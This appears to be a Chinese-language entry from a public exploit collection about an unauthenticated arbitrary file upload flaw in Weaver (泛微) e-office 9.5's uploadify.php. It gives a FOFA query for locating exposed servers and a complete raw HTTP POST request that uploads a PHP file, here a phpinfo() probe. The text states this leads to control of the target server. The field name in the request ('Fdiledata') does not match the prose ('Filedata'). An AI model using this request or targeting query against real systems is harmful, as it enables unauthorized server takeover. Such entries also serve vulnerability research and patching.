## 泛微e-office-uploadify.php存在任意文件上传漏洞

  由于泛微e-office 9.5版本源文件/inc/jquery/uploadify/uploadify.php存在问题，对参数Filedata的操作会导致不受限制的上传，未经身份验证的恶意攻击者通过上传恶意文件，从而获取目标服务器的控制权限。

## fofa

```
app="泛微-EOffice"
```

## poc

```
POST /inc/jquery/uploadify/uploadify.php  HTTP/1.1
Host: your-ip
Content-Length: 204
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Connection: close
 
------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
Content-Disposition: form-data; name="Fdiledata"; filename="uploadify.php."
Content-Type: image/jpeg
 
<?php phpinfo();?>
------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406131042971.png)

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406131042601.png)